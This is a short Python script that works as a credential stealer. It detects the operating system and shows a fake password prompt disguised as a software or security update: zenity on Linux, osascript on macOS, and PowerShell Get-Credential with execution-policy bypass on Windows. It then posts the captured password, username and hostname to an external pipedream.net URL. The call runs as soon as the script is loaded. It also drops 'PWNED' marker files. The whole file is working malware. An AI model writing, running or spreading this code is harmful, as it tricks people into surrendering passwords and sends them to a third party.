import requests,getpass,platform,os,shutil,time

def get_os():
    OS = platform.system()
    if OS.lower() == "linux":
        return "meow"
    elif OS.lower() == "windows":
        return "i_hate_windows"
    elif OS.lower() == "darwin":
        return "meow2"
    else:
        return False


def steal():
    try:
        CHECK = get_os()
        if CHECK == "meow":
            if getpass.getuser().lower() != "root":
                if shutil.which("zenity"):
                    passwd = os.popen('zenity --password --text "Mandatory Updates Required. Authentication Required." --title "Software Updates"').read()
                    return passwd
                else:
                    os.popen("echo 'PWNED!!' > $HOME/.pwned.txt")
            else:
                os.popen("echo 'Why Running as Root :(' > /opt/pwned.txt")
        elif CHECK == "meow2":
            if getpass.getuser().lower() != "root":
                if shutil.which("osascript"):
                    cmd= """osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon stop with hidden answer' """
                    passwd = os.popen(cmd).read()
                    return passwd                
                else:
                    os.popen("echo 'PWNED!!' > $HOME/.pwned.txt")
            else:
                os.popen("echo 'Why Running as Root :(' > /opt/pwned.txt")
        elif CHECK == "i_hate_windows":
            if getpass.getuser().lower() != "administrator":
                passwd = os.popen("""powershell.exe -ep bypass -c "$cred = Get-Credential -UserName $env:USERNAME -Message 'Administrator Access Required'"; [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($cred.Password))""").read()
                return passwd
            else:
                os.popen("powershell -c \"echo 'Why Running as Administrator :(' > C:\\Users\\$env:USERNAME\\pwned.txt\"")
        else:
            return False
    except Exception:
        return False

def exfil():
    username = getpass.getuser()
    hostname = platform.node()
    passwd = steal()
    if passwd:
        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname, "Password": passwd})
    else:
        requests.post("https://en0w6ukj0qarx.x.pipedream.net/",json={"Username": username, "Hostname": hostname})


exfil()